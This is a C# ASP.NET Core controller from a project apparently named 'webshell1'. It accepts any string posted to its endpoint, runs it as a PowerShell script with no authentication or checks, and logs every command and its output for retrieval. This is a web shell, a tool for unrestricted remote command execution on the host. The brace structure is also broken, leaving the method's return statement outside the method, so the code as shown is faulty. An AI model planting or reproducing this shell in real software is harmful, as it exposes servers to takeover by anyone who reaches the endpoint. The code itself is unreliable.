using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Text;
using System.Threading.Tasks;

namespace webshell1.Controllers
{
    [Route("[controller]")]
    [ApiController]
    public class CommandsController : Controller
    {
        private readonly CommandContext context;
    
        public CommandsController(CommandContext context)
        {
            this.context = context;
        }
        [HttpGet]
        public async Task<ActionResult<List<Command>>> Index()
        {
            return await context.Commands.ToListAsync();
        }
        [HttpPost]
        public async Task PostCommand([FromBody] string input)
        {
            string output = await RunScript(input);
            Command command = new Command { Input = input, Output = output };
            context.Commands.Add(command);
            await context.SaveChangesAsync();
            //return CreatedAtAction("Index", new { id = command.Id }, command);
        }
        public async Task<string> RunScript(string scriptContents)
        {
            // create a new hosted PowerShell instance using the default runspace.
            // wrap in a using statement to ensure resources are cleaned up.
            string output = "";
            PowerShell ps = PowerShell.Create();
                
                // specify the script code to run.
                ps.AddScript(scriptContents);

                // execute the script and await the result.
                var pipelineObjects = await ps.InvokeAsync();

            // print the resulting pipeline objects to the console.
            foreach (var item in pipelineObjects)

                output += item.BaseObject.ToString();
        }
            return output;
        }
    }
    }

